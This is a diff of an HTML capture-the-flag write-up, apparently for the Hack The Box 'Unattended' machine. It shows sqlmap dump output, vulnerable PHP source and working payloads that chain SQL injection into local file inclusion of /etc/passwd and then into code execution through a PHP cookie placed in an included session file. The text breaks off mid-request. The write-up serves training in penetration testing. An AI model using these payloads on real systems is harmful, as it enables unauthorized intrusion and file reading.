+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">465</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">5</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">about</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">0</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">3</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">587</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">7</span>
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">contact</span>
+<span class="k">Database</span><span class="p">:</span> <span class="n">neddy</span>
+<span class="k">Table</span><span class="p">:</span> <span class="n">idname</span>
+<span class="p">[</span><span class="mi">6</span> <span class="n">entries</span><span class="p">]</span>
+<span class="o">+</span><span class="c1">-----+-------------+----------+</span>
+<span class="o">|</span> <span class="n">id</span>  <span class="o">|</span> <span class="n">name</span>        <span class="o">|</span> <span class="n">disabled</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+-------------+----------+</span>
+<span class="o">|</span> <span class="mi">1</span>   <span class="o">|</span> <span class="n">main</span><span class="p">.</span><span class="n">php</span>    <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">2</span>   <span class="o">|</span> <span class="n">about</span><span class="p">.</span><span class="n">php</span>   <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">3</span>   <span class="o">|</span> <span class="n">contact</span><span class="p">.</span><span class="n">php</span> <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">25</span>  <span class="o">|</span> <span class="n">main</span>        <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">465</span> <span class="o">|</span> <span class="n">about</span>       <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">587</span> <span class="o">|</span> <span class="n">contact</span>     <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+-------------+----------+</span>
 
-[18:07:32] [INFO] table 'neddy.idname' dumped to CSV file '/root/.sqlmap/output/www.nestedflanders.htb/dump/neddy/idname.csv'               
-[18:07:32] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.nestedflanders.htb'
-[*] ending @ 18:07:32 /2019-08-23/
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="k">table</span> <span class="s1">'neddy.idname'</span> <span class="n">dumped</span> <span class="k">to</span> <span class="n">CSV</span> <span class="n">file</span> <span class="s1">'/root/.sqlmap/output/www.nestedflanders.htb/dump/neddy/idname.csv'</span>               
+<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetched</span> <span class="k">data</span> <span class="n">logged</span> <span class="k">to</span> <span class="n">text</span> <span class="n">files</span> <span class="k">under</span> <span class="s1">'/root/.sqlmap/output/www.nestedflanders.htb'</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ending</span> <span class="o">@</span> <span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">32</span> <span class="o">/</span><span class="mi">2019</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">23</span><span class="o">/</span>
 </code></pre></div></div>
 <p><br></p>
 <hr>
 
 <h2 id="sqli-to-lfi">SQLI to LFI</h2>
 <p><br> Now we have the actual file names, <code class="highlighter-rouge">about</code> for example (<code class="highlighter-rouge">/47c1ba4f7b1edf28ea0e2bb250717093.php </code>) :
-<img src="/images/hackthebox/unattended/14.png" alt="">
+<br><img src="/images/hackthebox/unattended/14.png" alt=""><br>
 <br> It’s just the text and nothing else. We can also verify that there is nothing hidden by checking the <code class="highlighter-rouge">php</code> source of the three pages :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/47c1ba4f7b1edf28ea0e2bb250717093.php
-&lt;body class="container"&gt;
-&lt;div&gt;
-Hello &lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : "visitor" ; ?&gt;,&lt;br&gt;
-our Company is world wide leading expert about Nesting stuff.&lt;/div&gt;
-&lt;div&gt;
-We can nest almost everything after or before anything based on your needs.&lt;br&gt;
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/47c1ba4f7b1edf28ea0e2bb250717093.php
+<span class="nt">&lt;body</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;div&gt;</span>
+Hello <span class="cp">&lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : "visitor" ; ?&gt;</span>,<span class="nt">&lt;br&gt;</span>
+our Company is world wide leading expert about Nesting stuff.<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;div&gt;</span>
+We can nest almost everything after or before anything based on your needs.<span class="nt">&lt;br&gt;</span>
 Feel free to contact us with usual email addresses, our contact form is currently offline because of a recent attack.
-&lt;/div&gt;
-&lt;/body&gt;
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
 root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/0f710bba8d16303a415266af8bb52fcb.php
-&lt;body class="container"&gt;
-Hello &lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : "visitor" ; ?&gt;,&lt;br&gt;
+<span class="nt">&lt;body</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+Hello <span class="cp">&lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : "visitor" ; ?&gt;</span>,<span class="nt">&lt;br&gt;</span>
 
-thanks for getting in touch with us!&lt;br&gt;
-Unfortunately our server is under *heavy* attack and we disable almost every dynamic page.&lt;br&gt;
-Please come back later.&lt;/br&gt;
-&lt;/body&gt;
+thanks for getting in touch with us!<span class="nt">&lt;br&gt;</span>
+Unfortunately our server is under *heavy* attack and we disable almost every dynamic page.<span class="nt">&lt;br&gt;</span>
+Please come back later.<span class="nt">&lt;/br&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
 root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/787c75233b93aa5e45c3f85d130bfbe7.php
-&lt;body class="container"&gt;
-&lt;div&gt;
-&lt;img src=787c75233b93aa5e45c3f85d130bfbe7.gif&gt;
-&lt;/div&gt;
-&lt;div&gt;
-Hello &lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : "visitor" ; ?&gt;,&lt;br&gt;
+<span class="nt">&lt;body</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;div&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">787c75233b93aa5e45c3f85d130bfbe7.gif</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;div&gt;</span>
+Hello <span class="cp">&lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : "visitor" ; ?&gt;</span>,<span class="nt">&lt;br&gt;</span>
 we are very sorry to show you this ridiculous page but we had to restore our website to 2001-layout.
-&lt;/div&gt;
-&lt;div&gt;
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;div&gt;</span>
 As a partial recover, we offer you a printed portfolio: just drop us an email with a contact request.
-&lt;/div&gt;
-&lt;div&gt;
-&lt;/div&gt;
-&lt;/body&gt;
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;div&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
 </code></pre></div></div>
 <p><br> First guess will be that the page name gets queried from the database table <code class="highlighter-rouge">idname</code> then the path (or the actual <code class="highlighter-rouge">php</code> file name) gets queried from the database table <code class="highlighter-rouge">filepath</code> then it includes that page to the index page. And that’s true but since we have the source of <code class="highlighter-rouge">index.php</code> let’s also look at it.
 <br> By looking at the dumped tables and the source of <code class="highlighter-rouge">index.php</code> again we can understand the following :
 <br> The <code class="highlighter-rouge">SQL</code> injectable query we just exploited is part of the function <code class="highlighter-rouge">getTplFromID</code> which returns the page name after querying it from the table <code class="highlighter-rouge">idname</code> based on our given id number : 
 <br> Function <code class="highlighter-rouge">getTplFromID()</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function getTplFromID($conn) {
-	global $debug;
-	$valid_ids = array (25,465,587);
-	if ( (array_key_exists('id', $_GET)) &amp;&amp; (intval($_GET['id']) == $_GET['id']) &amp;&amp; (in_array(intval($_GET['id']),$valid_ids)) ) {
-			$sql = "SELECT name FROM idname where id = '".$_GET['id']."'";
-	} else {
-		$sql = "SELECT name FROM idname where id = '25'";
-	}
-	if ($debug) { echo "sqltpl: $sql&lt;br&gt;\n"; } 
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="nf">getTplFromID</span><span class="p">(</span><span class="nv">$conn</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">global</span> <span class="nv">$debug</span><span class="p">;</span>
+	<span class="nv">$valid_ids</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span><span class="mi">25</span><span class="p">,</span><span class="mi">465</span><span class="p">,</span><span class="mi">587</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'id'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]),</span><span class="nv">$valid_ids</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '"</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">.</span><span class="s2">"'"</span><span class="p">;</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '25'"</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"sqltpl: </span><span class="nv">$sql</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span> 
 	
-	$result = $conn-&gt;query($sql);
-	if ($result-&gt;num_rows &gt; 0) {
-	while($row = $result-&gt;fetch_assoc()) {
-		$ret = $row['name'];
-	}
-	} else {
-		$ret = 'main';
-	}
-	if ($debug) { echo "rettpl: $ret&lt;br&gt;\n"; }
-	return $ret;
-}
+	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
+		<span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+	<span class="p">}</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="nv">$ret</span> <span class="o">=</span> <span class="s1">'main'</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"rettpl: </span><span class="nv">$ret</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
+	<span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div></div>
 <p><br> Table <code class="highlighter-rouge">idname</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-----+-------------+----------+
-| id  | name        | disabled |
-+-----+-------------+----------+
-| 1   | main.php    | 1        |
-| 2   | about.php   | 1        |
-| 3   | contact.php | 1        |
-| 25  | main        | 0        |
-| 465 | about       | 0        |
-| 587 | contact     | 0        |
-+-----+-------------+----------+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">+</span><span class="c1">-----+-------------+----------+</span>
+<span class="o">|</span> <span class="n">id</span>  <span class="o">|</span> <span class="n">name</span>        <span class="o">|</span> <span class="n">disabled</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+-------------+----------+</span>
+<span class="o">|</span> <span class="mi">1</span>   <span class="o">|</span> <span class="n">main</span><span class="p">.</span><span class="n">php</span>    <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">2</span>   <span class="o">|</span> <span class="n">about</span><span class="p">.</span><span class="n">php</span>   <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">3</span>   <span class="o">|</span> <span class="n">contact</span><span class="p">.</span><span class="n">php</span> <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">25</span>  <span class="o">|</span> <span class="n">main</span>        <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">465</span> <span class="o">|</span> <span class="n">about</span>       <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">587</span> <span class="o">|</span> <span class="n">contact</span>     <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+-------------+----------+</span>
 </code></pre></div></div>
 <p><br> There is another function called <code class="highlighter-rouge">getPathFromTpl</code> which takes the returned page name and queries the actual path from the table <code class="highlighter-rouge">filepath</code> then returns it :
 <br> Function <code class="highlighter-rouge">getPathFromTpl()</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function getPathFromTpl($conn,$tpl) {
-	global $debug;
-	$sql = "SELECT path from filepath where name = '".$tpl."'";
-	if ($debug) { echo "sqlpath: $sql&lt;br&gt;\n"; }
-	$result = $conn-&gt;query($sql);
-	if ($result-&gt;num_rows &gt; 0) {
-		while($row = $result-&gt;fetch_assoc()) {
-			$ret = $row['path'];
-		}
-	}
-	if ($debug) { echo "retpath: $ret&lt;br&gt;\n"; }
-	return $ret;
-}
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="nf">getPathFromTpl</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$tpl</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">global</span> <span class="nv">$debug</span><span class="p">;</span>
+	<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT path from filepath where name = '"</span><span class="o">.</span><span class="nv">$tpl</span><span class="o">.</span><span class="s2">"'"</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"sqlpath: </span><span class="nv">$sql</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
+	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
+			<span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'path'</span><span class="p">];</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"retpath: </span><span class="nv">$ret</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
+	<span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div></div>
 <p><br> Table <code class="highlighter-rouge">filepath</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+---------+--------------------------------------+
-| name    | path                                 |
-+---------+--------------------------------------+
-| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |
-| contact | 0f710bba8d16303a415266af8bb52fcb.php |
-| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
-+---------+--------------------------------------+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">+</span><span class="c1">---------+--------------------------------------+</span>
+<span class="o">|</span> <span class="n">name</span>    <span class="o">|</span> <span class="n">path</span>                                 <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------+--------------------------------------+</span>
+<span class="o">|</span> <span class="n">about</span>   <span class="o">|</span> <span class="mi">47</span><span class="n">c1ba4f7b1edf28ea0e2bb250717093</span><span class="p">.</span><span class="n">php</span> <span class="o">|</span>
+<span class="o">|</span> <span class="n">contact</span> <span class="o">|</span> <span class="mi">0</span><span class="n">f710bba8d16303a415266af8bb52fcb</span><span class="p">.</span><span class="n">php</span> <span class="o">|</span>
+<span class="o">|</span> <span class="n">main</span>    <span class="o">|</span> <span class="mi">787</span><span class="n">c75233b93aa5e45c3f85d130bfbe7</span><span class="p">.</span><span class="n">php</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------+--------------------------------------+</span>
 </code></pre></div></div>
 <p><br> The first function gets called and its return value gets saved in the variable <code class="highlighter-rouge">tpl</code> : <code class="highlighter-rouge">$tpl = getTplFromID($conn);</code>
 <br> Then the second function gets called with the variable <code class="highlighter-rouge">tpl</code> and its return value gets saved in the variable <code class="highlighter-rouge">inc</code>
 <br> And finally it includes that page <code class="highlighter-rouge">include("$inc");</code>
 <br> We have a <code class="highlighter-rouge">SQL</code> injection vulnerability which we can use to control what’s being included, in other words we have a local file inclusion vulnerability.
 <br> After some attempts to read <code class="highlighter-rouge">/etc/passwd</code> this payload worked : <code class="highlighter-rouge">' UNION SELECT "main' UNION SELECT '/etc/passwd';-- ";--</code>
-<img src="/images/hackthebox/unattended/15.png" alt="">
+<br><img src="/images/hackthebox/unattended/15.png" alt=""><br>
 <br></p>
 <hr>
 
 <h2 id="lfi-to-rce">LFI to RCE</h2>
 <p><br> We need to get <code class="highlighter-rouge">RCE</code> from this <code class="highlighter-rouge">LFI</code>. If I could include my session file (<code class="highlighter-rouge">/var/lib/php/session/sess_[SESSION COOKIE]</code>) then I could put <code class="highlighter-rouge">php</code> code in a cookie and include it. My session cookie was <code class="highlighter-rouge">c5vmccsqkle2rdionj28kit221</code>.
 <br> Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
-Host: www.nestedflanders.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Cookie: PHPSESSID=c5vmccsqkle2rdionj28kit221;
-Connection: close
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.nestedflanders.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=c5vmccsqkle2rdionj28kit221;</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
 </code></pre></div></div>
 <p><br> Response :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
-Server: nginx/1.10.3
-Date: Fri, 23 Aug 2019 16:25:24 GMT
-Content-Type: text/html; charset=UTF-8
-Content-Length: 935
-Connection: close
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-Vary: Accept-Encoding
-X-Upstream: 127.0.0.1:8080
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.10.3</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 23 Aug 2019 16:25:24 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">935</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">X-Upstream</span><span class="p">:</span> <span class="s">127.0.0.1:8080</span>
 
-&lt;!DOCTYPE html&gt;
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
 ----------------
  Removed Output
 ----------------
-&lt;!-- &lt;div align="center"&gt; --&gt;
+<span class="c">&lt;!-- &lt;div align="center"&gt; --&gt;</span>
 PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";
-&lt;!-- &lt;/div&gt; --&gt;
+<span class="c">&lt;!-- &lt;/div&gt; --&gt;</span>
 
-&lt;/div&gt; &lt;!-- row --&gt;
-&lt;/div&gt; &lt;!-- container --&gt;
+<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- row --&gt;</span>
+<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- container --&gt;</span>
 
-&lt;/body&gt;
-&lt;/html&gt;
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
 </code></pre></div></div>
 <p><br> It worked, I created a cookie and called it <code class="highlighter-rouge">RCE</code>, any <code class="highlighter-rouge">php</code> code I put there will be included and executed so we can get <code class="highlighter-rouge">RCE</code> by <code class="highlighter-rouge">system()</code> or <code class="highlighter-rouge">passthru()</code>, let’s try <code class="highlighter-rouge">whoami</code> :
 <br> Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
-Host: www.nestedflanders.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Cookie: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('whoami')?&gt;;
-Connection: close
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.nestedflanders.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
